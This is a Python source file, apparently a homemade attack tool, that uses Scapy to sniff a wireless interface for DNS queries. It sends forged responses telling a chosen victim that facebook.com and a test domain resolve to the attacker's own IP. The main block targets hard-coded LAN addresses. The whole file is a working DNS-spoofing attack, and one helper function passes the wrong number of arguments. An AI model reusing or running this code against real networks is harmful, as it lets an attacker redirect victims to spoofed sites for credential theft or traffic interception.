import os
import logging as log
import platform
import threading
from tabnanny import verbose

from scapy.all import *
from scapy.layers.dns import DNSRR, DNS, IP, UDP

from utils import get_local_ip, thread_with_trace

local_ip = get_local_ip()

hosts_dict = {
    "facebook.com.": local_ip,
    "something.hello.": local_ip
}

domains = hosts_dict.keys()


def forge_packet(packet_to_forge, ip):
    RR_TTL = 60
    forged_DNSRR = DNSRR(rrname=packet_to_forge[DNS].qd.qname, ttl=RR_TTL, rdlen=4, rdata=ip)
    forged_packet = IP(src=packet_to_forge[IP].dst, dst=packet_to_forge[IP].src) / \
                    UDP(sport=packet_to_forge[UDP].dport, dport=packet_to_forge[UDP].sport) / \
                    DNS(id=packet_to_forge[DNS].id, qr=1, aa=1, qd=packet_to_forge[DNS].qd, an=forged_DNSRR)
    return forged_packet


def packet_handler(packet_to_process, target, ip):
    if packet_to_process.haslayer(DNS) and packet_to_process[DNS].qr == 0:
        # print(packet_to_process[DNS].qd.qname.decode('UTF-8'))
        # print(packet_to_process[IP].src)
        if packet_to_process[DNS].qd.qname.decode('UTF-8') in domains:
            print(packet_to_process)
            if target is None or packet_to_process[IP].src == target:
                forged_packet = forge_packet(packet_to_process, ip)
                send(forged_packet, verbose=0)
                print(
                    f"[*] Forged DNS response sent. Told {packet_to_process[IP].src} that {packet_to_process[DNS].qd.qname.decode('UTF-8')} was at {ip}")


def start_dns_poisoning(interface_to_listen, target, ip):
    # while not cancel_token.is_set():
    sniff(iface=interface_to_listen, prn=lambda pkt: packet_handler(pkt, target, ip))


def dns_poisoning_loop(interface_to_listen, printing_queue, verbosity):
    cancel_token = threading.Event()
    dns_thread = threading.Thread(target=start_dns_poisoning,
                                  args=(interface_to_listen, printing_queue, verbosity, cancel_token))
    dns_thread.start()
    return dns_thread


if __name__ == "__main__":
    start_dns_poisoning("wlan0", "192.168.2.100", "192.168.2.113")
